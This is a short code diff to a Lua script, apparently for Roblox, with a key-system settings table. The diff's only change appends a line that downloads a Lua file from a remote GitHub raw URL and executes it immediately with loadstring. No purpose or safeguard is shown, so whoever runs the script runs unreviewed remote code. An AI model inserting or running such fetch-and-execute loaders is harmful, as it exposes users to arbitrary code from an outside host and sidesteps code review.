@@ -12,3 +12,5 @@ local KeySettings = {
    GrabKeyFromSite = false,
    Key = "Hello"
 }
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/MrKittyOfc/test/main/more.lua'))()
